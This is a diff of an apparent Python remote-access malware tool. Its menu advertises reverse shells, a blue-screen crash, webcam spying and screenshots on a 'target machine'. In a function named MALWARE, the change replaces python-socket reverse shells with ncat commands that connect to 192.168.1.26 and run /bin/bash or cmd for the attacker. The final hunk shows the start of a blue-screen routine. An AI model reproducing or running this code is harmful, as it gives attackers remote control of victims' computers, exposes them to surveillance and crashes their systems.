@@ -64,7 +64,7 @@ LISTENER_MENU_BANNER = ("""
  \033[97;1m║>>>\033[0m \033[91mzombie -w\033[0m      \033[97;1mStart zombie mode on the target machine Windows                   ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mbsod\033[0m           \033[97;1mStart BSOD mode on the target machine                             ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mipinfo\033[0m         \033[97;1mObtain all the IP address information of the target machine       ║\033[0m
- \033[97;1m║>>>\033[0m \033[91mwebcam\033[0m         \033[97;1mObtain the real-time webcam of the target machine.                ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mwebcam\033[0m         \033[97;1mObtain the real-time webcam of the target machine                 ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mscreenshot\033[0m     \033[97;1mObtain the screenshot of the target machine webcam                ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [listener] tool                                         ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mleave\033[0m          \033[97;1mQuit [listener] tool                                              ║\033[0m
@@ -111,10 +111,10 @@ def MALWARE():
         MALWARE_RECV = SOCKET.recv(8000).decode()
         
         if MALWARE_RECV == "zombie -l":
-           os.system('python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\'192.168.1.26\', 834)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\'sh\')"')
+           os.system("ncat 192.168.1.26 834 -e /bin/bash")
            
         if MALWARE_RECV == "zombie -w":
-           os.system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.1.26\', 835)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\'cmd.exe\')'")
+           os.system("ncat 192.168.1.26 835 -e cmd")
            
         if MALWARE_RECV == "bsod":
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
